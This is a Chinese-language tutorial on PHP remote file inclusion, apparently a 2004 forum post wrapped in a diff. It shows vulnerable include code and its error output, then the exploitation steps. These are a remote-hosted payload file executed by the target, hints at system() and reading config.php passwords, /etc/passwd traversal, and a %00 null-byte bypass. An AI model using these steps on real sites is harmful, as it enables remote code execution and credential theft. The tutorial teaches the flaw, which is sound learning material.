@@ -1,0 +1,44 @@
+
+php远端档包含漏洞基本
+这篇文章里我会告诉php远程档包含漏洞的原理，初涉程式师的人必看。
+本帖隐藏的内容需要回复才可以浏览
+首先的问题是，什么才是”远程档包含漏洞“？简要的回答是伺服器通过php的任意档包含过滤不严，从而去执行一个恶意档，这是个程式师过滤上的问题，请记住，所有的cgi程式都有这样的bug。
+1.找出bug：
+为了发现目标，我们首先要知道包含两个字的含义，在所有语言里(大多数)都有这种方法包含任意的档。在php里，我们使用include()函数，它的工作流程：
+如果你在Main.php里包含include1.php,我将这样写include("include1.php").不是很科学，但你要知道其中的道理。
+我们先看这个，当用户输入通过后就包含档，也就是
+if ($_GET[page]) {
+include $_GET[page];
+} else {
+include "home.php";
+}
+这种结构在动态网站里是常见的，问题是它允许这样http://www.target.com /explame.php?page=main.php或者http://www.target.com/explame.php? page=downloads.php来查看。无论如何，如果你的程式里有这样的bug也很悲哀了，只能怪你，尽管只是一句过滤的问题，但就是这一句过滤就有了Script hacker.在zone-h.org的调查里，档包含的攻击率占到9.4%，足够我们引起重视，而且它也不是一两天的问题，几年前就有了，但到了今天，一批一批程式师依旧走老路重走，所以就有了这篇文章，在2004年写这样的文章已经老掉牙，但我还是要写，毕竟牢骚能让人收益的时候就不叫牢骚了。
+2.测试
+这里有个远端档包含的例子，目的只有一个，为了你的程式安全，我们来看具体的
+http://www.target.com/explame.php?page=zizzy
+Warning: main(zizzy): failed to open stream: No such file or directory in /var/www/htdocs/index.php on line 3
+Warning: main(): Failed opening 'zizzy' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/htdocs/index.php on line 3
+php输出的这些错误资讯告诉我们，程式去包含档/var/www/htdocs/zizzy，但没找到，看见了吧，No such file or directory没这样的档，现在理解了吧。
+3.利用
+php确实很好，可以远端调用档，那我创建一个yeah.txt,放在我的站上http://www.mysite.com/yeah.txt.内容这样
+<?
+echo "Wow,test!";
+?>
+那么http://www.target.com/explame.php?pa...e.com/yeah.txt
+OK,回显Wow,test!，这样就执行了。读取config.php也不难吧，里面放了mysql密码啊。把yeah.txt写成<? phpinfo; ?>看看，写成system()去试试，有什么感想，在过分点，这样提交page=../../../../.. /../../etc/passwd。知道什么叫真正的包含了吧。
+4.另一种
+有时程式师换种写法，写成这样，限制了包含范围
+if ($_GET[page]) {
+include "$_GET[page].php";
+} else {
+include "home.php";
+}
+我们提交http://www.target.com/explame.php?pa...e.com/yeah.txt
+Warning: main(http://www.mysite.com/yeah.txt.php): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var/www/htdocs/explame.php on line 3
+Warning: main(): Failed opening 'http://www.mysite.com/yeah.txt.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/htdocs /explame.php on line 3
+包含失败了，限制了尾码名为php,那mysite.com的yeah.txt改为yeah.php,ok,照样执行了
+那passwd怎么办
+Warning: main(../../../../../../../etc/passwd.php): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var /www/htdocs/explame.php on line 3
+Warning: main(): Failed opening '../../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib /php') in /var/www/htdocs/explame.php on line 3
+在这里使用个NUL字元，也就是%00来跳过检测
+http://www.target.com/explame.php?pa.../etc/passwd%00 
